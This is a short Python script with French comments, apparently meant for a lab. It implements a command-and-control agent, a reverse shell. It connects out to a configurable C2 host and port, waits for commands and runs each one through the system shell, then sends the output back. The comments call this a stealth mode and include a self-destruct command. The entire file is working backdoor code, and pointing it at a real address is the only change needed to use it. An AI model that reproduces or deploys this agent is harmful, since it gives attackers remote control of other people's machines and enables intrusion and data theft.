import socket
import subprocess

# ==========================================
# CONFIGURATION DE L'AGENT (Lab Seulement)
# ==========================================
C2_HOST = '127.0.0.1' # L'IP de votre C2
C2_PORT = 4444        # Le port de votre C2

def call_home():
    print(f"[*] Tentative de connexion au C2 ({C2_HOST}:{C2_PORT})...")
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((C2_HOST, C2_PORT))
            
            # 1. La connexion est réussie, on prévient le maître
            print("[+] Connecté au C2 ! Mode furtif activé (en attente d'ordres).")
            
            while True:
                # 2. Réception de la commande (Max 4096 octets)
                data = s.recv(4096)
                if not data:
                    break # Le C2 a coupé la connexion
                    
                command = data.decode('utf-8').strip()
                
                if command.lower() == 'exit':
                    break # Ordre d'auto-destruction
                    
                # 3. Exécution de la commande sur le système (C'EST ICI LE DANGER)
                # subprocess.Popen permet de brancher la sortie du terminal vers notre script
                try:
                    proc = subprocess.Popen(
                        command, 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE, 
                        stdin=subprocess.PIPE
                    )
                    
                    # On lit la réponse du terminal (sortie standard + erreurs)
                    stdout_value, stderr_value = proc.communicate()
                    output = stdout_value + stderr_value
                    
                    # Si la commande ne renvoie rien (ex: 'mkdir test'), on envoie un accusé
                    if not output:
                        output = b"[+] Commande executee (aucun retour console).\n"
                        
                    # 4. On renvoie le résultat au C2
                    s.sendall(output)
                    
                except Exception as e:
                    # En cas de commande invalide, on renvoie l'erreur au C2 pour ne pas crasher l'agent
                    s.sendall(f"[-] Erreur locale de l'agent : {str(e)}\n".encode('utf-8'))
                    
        except ConnectionRefusedError:
            print("[-] C2 injoignable. Le serveur d'écoute est-il allumé ?")

if __name__ == "__main__":
    call_home()